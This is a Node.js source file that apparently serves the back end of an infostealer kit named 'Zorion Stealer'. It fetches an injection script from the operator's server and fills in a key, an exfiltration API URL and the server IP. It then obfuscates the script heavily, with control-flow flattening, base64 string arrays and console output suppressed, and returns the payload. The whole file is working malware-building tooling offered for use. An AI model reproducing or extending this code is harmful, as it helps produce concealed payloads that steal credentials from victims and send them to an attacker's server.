const fs = require('fs');
const axios = require('axios');
const express = require('express');
const path = require('path');
const bodyParser = require("body-parser");
const os = require('os');
const username = os.userInfo().username;
const config = require(path.join('C:', 'Users', username, 'Desktop', 'Zorion Stealer', 'config.json'));
const JavaScriptObfuscator = require('javascript-obfuscator');
const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

module.exports = async (req, res) => {
    const { key } = req.body;
    const vdsip = config.ip;
    const api_url = `https://${config.ip}/api/send-injection`
    if (!key) return res.status(400).send('key where amq');

    try {
        const response = await axios.get(`https://${config.ip}/ananaisiekmtyoreospcug`);
        if (response.status !== 200) throw new Error('Failed to fetch script');

        const data = response.data;

        const replaced = data.replace("%KEY%", key).replace("%API_URL%", api_url).replace("%VDS_IP%", vdsip);

        const obfuscationResult = JavaScriptObfuscator.obfuscate(replaced, {
            "ignoreRequireImports": true,
            "compact": true,
            "controlFlowFlattening": true,
            "controlFlowFlatteningThreshold": 0.5,
            "deadCodeInjection": false,
            "deadCodeInjectionThreshold": 0.01,
            "debugProtection": false,
            "debugProtectionInterval": 0,
            "disableConsoleOutput": true,
            "identifierNamesGenerator": "hexadecimal",
            "log": true,
            "numbersToExpressions": false,
            "renameGlobals": false,
            "selfDefending": false,
            "simplify": true,
            "splitStrings": false,
            "splitStringsChunkLength": 5,
            "stringArray": true,
            "stringArrayEncoding": ["base64"],
            "stringArrayIndexShift": true,
            "stringArrayRotate": false,
            "stringArrayShuffle": false,
            "stringArrayWrappersCount": 5,
            "stringArrayWrappersChainedCalls": true,
            "stringArrayWrappersParametersMaxCount": 5,
            "stringArrayWrappersType": "function",
            "stringArrayThreshold": 1,
            "transformObjectKeys": false,
            "unicodeEscapeSequence": false
        });

        const output = obfuscationResult.getObfuscatedCode();
        return res.send(output);
    } catch (error) {
        console.error(error);
        return res.status(500).send('Internal Server Error');
    }
};